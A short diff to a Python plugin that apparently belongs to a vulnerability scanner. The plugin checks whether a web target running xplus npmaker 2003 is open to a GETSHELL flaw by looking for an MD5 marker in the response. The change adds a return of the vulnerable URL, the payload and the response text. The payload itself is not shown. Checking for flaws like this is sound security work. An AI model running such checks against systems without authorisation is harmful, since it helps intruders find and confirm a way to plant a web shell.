@@ -35,6 +35,7 @@ class xplus_2003_getshell_BaseVerify:
             req2 = requests.get(verifyurl, headers=headers, timeout=10, verify=False)
             if req2.status_code == 200 and r"81dc9bdb52d04dc20036dbd8313ed055" in req2.text:
                 cprint("[+]存在xplus npmaker 2003系统GETSHELL漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
+                return True, vulnurl, "xplus npmaker 2003系统GETSHELL", payload, req.text
             else:
                 cprint("[-]不存在xplus_2003_getshell漏洞", "white", "on_grey")
                 return False, None, None, None, None
